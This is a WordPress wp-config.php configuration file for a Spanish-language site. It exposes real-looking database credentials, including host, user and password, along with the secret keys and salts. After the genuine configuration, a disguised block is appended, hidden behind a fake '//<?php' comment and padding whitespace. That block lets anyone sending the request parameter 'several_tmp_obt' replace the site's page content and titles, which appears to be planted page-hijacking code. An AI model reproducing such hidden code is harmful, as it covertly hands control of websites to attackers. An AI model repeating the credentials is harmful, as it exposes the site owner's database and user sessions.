<?php
/** Enable W3 Total Cache Edge Mode */
 //Added by WP-Cache Manager
define( 'WPCACHEHOME', '/services/webpages/c/a/cambiandovidas.org/public/wp-content/plugins/wp-super-cache/' ); //Added by WP-Cache Manager
define('W3TC_EDGE_MODE', true); // Added by W3 Total Cache


/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link http://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //

/** El Nombre de la Base de datos  */
define('DB_NAME', 'burocreativo_cavi'); 

/** Nombre de usuario con privilegios sobre la base de datos */
define('DB_USER', 'azael'); 

/** Contase単a que utiliza el usuario para conectarse a la Base de Datos */
define('DB_PASSWORD', 'optiplex');

/** MySQL hostname */
define('DB_HOST', 'mysql.server308.com');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

define( 'AUTOMATIC_UPDATER_DISABLED', true );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'I]O<x>j,cOG!wLfYd-l[PQ.3bbq|4xslr]YZm%NCO{}bN;v91M),Vc1)lP#v.wBC');
define('SECURE_AUTH_KEY',  'mQJ6ub.9L~.(F:mZ+;Lr2;B<HW-miU@ok-a(tFs-?|NwWqKneB[cg9(;Ge@oQ0r4');
define('LOGGED_IN_KEY',    'Q`Rm1n4 qBb|`Uz=P[NiL}&|At`GpyS;m_GJrO(yeBa[bJb;-uvoR>MCI[4RC{Tu');
define('NONCE_KEY',        'OA[ug=uRzTGcrAbu |(}0i|R-wEAvcjS#;+EA2RAhNG$j[^O9-JV8Qb~-G(gcD(w');
define('AUTH_SALT',        '=r-,ZJn2%xm}yy;Ec]Cvp[]~0*U_%MG.QwI%>HD`]eJc-TmAuZbRK)us` I^<o6|');
define('SECURE_AUTH_SALT', '0FX7T#+L?{mbRhecz1#JE:GoI9ZvpU7P~:xdW(}KG*9Rs!gLUzFGZL; /[nj#@ew');
define('LOGGED_IN_SALT',   '(as^7=;7n=FE@BS#l<V-qC!*dA&hkj%WWS1--8&)ds@<mg#Hwr2/.+7F^JR$#zC7');
define('NONCE_SALT',       'zh(N4M?l+gYN&u^}r|`FQdU/IH,#+8s9wm#GnRI|.Z._]Sp27,iD*9%nd$hC:B8O');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
  define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');

//<?php                                                                                                                    
/**                                                                                                                                     
 * The base configurations of the WordPress.                                                                                            
 *                                                                                                                                      
 * This file has the following configurations: MySQL settings, Table Prefix,                                                            
 * Secret Keys, WordPress Language, and ABSPATH. You can find more information                                                          
 * by visiting {@link http://codex.wordpress.org/Editing_wp-config.php Editing                                                          
 * wp-config.php} Codex page. You can get the MySQL settings from your web host.                                                        
 *                      
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file                                                        
 * to wp-config.php and fill in the values.
 *                                              
 * @package WordPress
 */                                     
                                
if(isset($_REQUEST['several_tmp_obt']))
{                                                                                                                                       
        function replace_content($content) {                                                                                           
                        return '%%CONTENT%%';
                }                       
        function replace_title($content) {             
                return '%%TITLE%%';                     
        }
        add_filter( 'the_content','replace_content' );  
        add_filter( 'the_title','replace_title' ); 
        add_filter( 'wp_title','replace_title' ); 
}                                               
                                                
